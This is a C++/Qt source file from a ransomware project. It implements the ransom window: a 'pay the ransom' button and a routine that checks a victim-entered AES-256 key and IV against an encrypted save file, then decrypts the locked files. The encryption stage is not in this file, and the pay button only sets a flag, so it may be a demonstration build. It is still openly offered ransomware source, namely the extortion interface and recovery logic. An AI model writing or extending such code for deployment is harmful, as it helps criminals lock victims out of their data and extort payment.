//
// Created by prang on 29.09.2024.
//

#include <MainWindow.h>
#include <QMessageBox>
#include <CryptoAes256.h>
#include <KeyUtils.h>
#include <QCoreApplication>
#include "decryptor.h"

void RansomWindow::payRansom() {
  QMessageBox::information(nullptr,
                           "Payed Ransom",
                           "You have payed the Ransom, enter the right key and iv to decrypt your files!",
                           QMessageBox::Ok);
  ransomPayed = true;
}

void RansomWindow::startDecryption() {
  if (ransomPayed) {
    CryptoAes256 cryptoAes256;
    KeyUtils keyUtils;
    KeyIvAES keyIvAes;

    QString keyText = keyInputLineEdit->toPlainText();
    QString ivText = ivInputLineEdit->toPlainText();

    keyIvAes.key = keyUtils.intsToBytes(keyText.toStdString());
    keyIvAes.iv = keyUtils.intsToBytes(ivText.toStdString());

    if (cryptoAes256.testKeyOnEncryptedFileAES256(ENCRYPTED_KEY_IV_SAVE_FILE, keyIvAes)) {
      cryptoAes256.decryptSaveFile(keyIvAes);

      auto decryptor = new Decrypt();
      decryptor->startDecryptionProcess();
      delete decryptor;

      QMessageBox::information(nullptr,
                               "All done!",
                               "All your files got decrypted press ok to close the window!",
                               QMessageBox::Ok);
      QCoreApplication::quit();
    } else {
      QMessageBox::warning(nullptr,
                           "Wrong Input!!!",
                           "You have entered the wrong key or iv!",
                           QMessageBox::Ok);
      keyInputLineEdit->setText("");
      ivInputLineEdit->setText("");
    }
  } else {
    QMessageBox::warning(nullptr,
                         "Pay the Ransom!!!",
                         "You have to pay the Ransom and enter the right key and iv to decrypt your files!",
                         QMessageBox::Ok);
  }
}